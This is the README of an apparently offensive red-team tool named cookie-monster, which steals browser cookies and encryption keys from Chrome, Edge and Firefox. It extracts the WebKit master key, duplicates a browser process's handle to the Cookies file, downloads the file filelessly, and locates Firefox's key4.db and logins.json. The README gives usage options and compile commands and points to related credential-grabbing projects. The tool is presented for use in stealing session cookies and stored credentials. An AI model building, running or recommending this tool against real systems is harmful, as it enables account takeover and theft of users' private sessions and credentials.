# cookie-monster
Steal browser cookies for edge, chrome and firefox through a BOF or exe! 
Cookie-Monster will extract the WebKit master key, locate a browser process with a handle to the COOKIES file, copy the handle and then fileless download the COOKIES.  

## BOF Usage
```
Usage: cookie-monster [ --chrome || --edge || --firefox || --chromepid <pid> || --edgepid <pid> ] 
cookie-monster Example: 
   cookie-monster --chrome 
   cookie-monster --edge 
   cookie-moster --firefox 
   cookie-monster --chromepid 1337 
   cookie-monster --edgepid 4444 
cookie-monster Options: 
    --chrome, looks at all running processes and handles, if one matches chrome.exe it copies the handle to cookies and then copies the file to the CWD 
    --edge, looks at all running processes and handles, if one matches msedge.exe it copies the handle to cookies and then copies the file to the CWD 
    --firefox, looks for profiles.ini and locates the key4.db and logins.json file 
    --chromepid, if chrome PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and cookie file 
    --edgepid, if edge PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and cookie file 
```

## EXE usage
```
Cookie Monster Example:
  cookie-monster.exe --all 
Cookie Monster Options:
  -h, --help                     Show this help message and exit
  --all                          Run chrome, edge, and firefox methods
  --edge                         Extract edge keys and download cookies file to PWD
  --chrome                       Extract chrome keys and download cookies file to PWD
  --firefox                      Locate firefox key and Cookies, does not make a copy of either file
```
## Installation
Ensure Mingw-w64 and make is installed on the linux prior to compiling.
```
make
```

to compile exe on windows
```
gcc .\cookie-monster.c -o cookie-monster.exe -lshlwapi -lcrypt32
```

## References
This project could not have been done without the help of Mr-Un1k0d3r and his amazing seasonal videos!
Highly recommend checking out his lessons!!! <br>
Cookie Webkit Master Key Extractor:
https://github.com/Mr-Un1k0d3r/Cookie-Graber-BOF <br>
Fileless download:
https://github.com/fortra/nanodump

